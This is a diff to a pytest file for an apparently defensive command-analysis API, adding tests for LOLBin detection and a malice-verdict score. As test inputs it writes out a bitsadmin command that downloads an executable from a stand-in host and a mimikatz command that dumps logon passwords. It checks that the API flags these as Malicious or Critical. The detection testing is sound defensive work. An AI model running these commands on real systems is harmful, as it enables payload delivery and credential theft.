@@ -96,7 +96,8 @@ def test_response_contains_all_required_keys(client, auth):
               "language", "input", "semantic_ir", "exec_graph", "behaviors",
               "evidence_refs", "confidence_summary", "reconstructed_commands",
               "decode_chain", "warnings", "unresolved_nodes",
-              "mitre", "mitre_navigator", "mitre_stix",
+              "mitre", "mitre_navigator", "mitre_stix", "lolbins_v2",
+              "verdict_v2",
               "processing_time_ms"):
         assert k in j, f"missing {k}"
 
@@ -144,12 +145,13 @@ def test_input_echoed_back(client, auth):
     assert r.json()["input"] == "SET X=1"
 
 
-def test_decode_chain_lists_five_steps(client, auth):
+def test_decode_chain_lists_seven_steps(client, auth):
     r = _post_parse(client, auth, input="echo hi")
     chain = r.json()["decode_chain"]
-    assert len(chain) == 5
-    assert chain[-2] == "behavior_extract"
-    assert chain[-1] == "mitre_v2"
+    assert len(chain) == 7
+    assert chain[-1] == "verdict_v2"
+    assert chain[-2] == "lolbin_v2"
+    assert chain[-3] == "mitre_v2"
 
 
 def test_warnings_field_is_list(client, auth):
@@ -473,3 +475,57 @@ def test_plugin_versions_include_mitre(client, auth):
     assert "mitre_mapper" in plugs
     assert "mitre_navigator" in plugs
     assert "mitre_stix" in plugs
+
+
+# ── Phase 6 · LOLBIN v2 API surface ───────────────────────────────
+def test_lolbins_v2_field_is_list(client, auth):
+    r = _post_parse(client, auth,
+                    input="bitsadmin /transfer job http://x.tld/a C:\\a.exe",
+                    language="cmd")
+    body = r.json()
+    assert isinstance(body["lolbins_v2"], list)
+
+
+def test_lolbins_v2_bitsadmin_is_executed(client, auth):
+    r = _post_parse(client, auth,
+                    input="bitsadmin /transfer job http://x.tld/a C:\\a.exe",
+                    language="cmd")
+    rows = r.json()["lolbins_v2"]
+    ba = [x for x in rows if x["binary"] == "bitsadmin"]
+    assert ba and ba[0]["state"] == "executed"
+    assert ba[0]["enters_verdict"] is True
+
+
+def test_lolbins_v2_plugin_version_advertised(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    assert "lolbin_v2" in r.json()["plugin_versions"]
+
+
+# ── Phase 7 · Verdict v2 API surface ──────────────────────────────
+def test_verdict_v2_field_shape(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    v = r.json()["verdict_v2"]
+    assert set(v["scores"]) == {
+        "intent", "capability", "execution", "impact",
+        "stealth", "persistence", "defense_evasion"
+    }
+    assert v["verdict"] in ("Benign", "Suspicious", "Malicious", "Critical")
+
+
+def test_verdict_v2_benign_for_echo(client, auth):
+    r = _post_parse(client, auth, input="echo hello world")
+    v = r.json()["verdict_v2"]
+    assert v["verdict"] == "Benign"
+
+
+def test_verdict_v2_malicious_or_critical_for_mimikatz(client, auth):
+    r = _post_parse(client, auth,
+                    input="mimikatz.exe sekurlsa::logonpasswords exit",
+                    language="cmd")
+    v = r.json()["verdict_v2"]
+    assert v["verdict"] in ("Malicious", "Critical")
+
+
+def test_verdict_v2_plugin_version_advertised(client, auth):
+    r = _post_parse(client, auth, input="echo hi")
+    assert "verdict_v2" in r.json()["plugin_versions"]
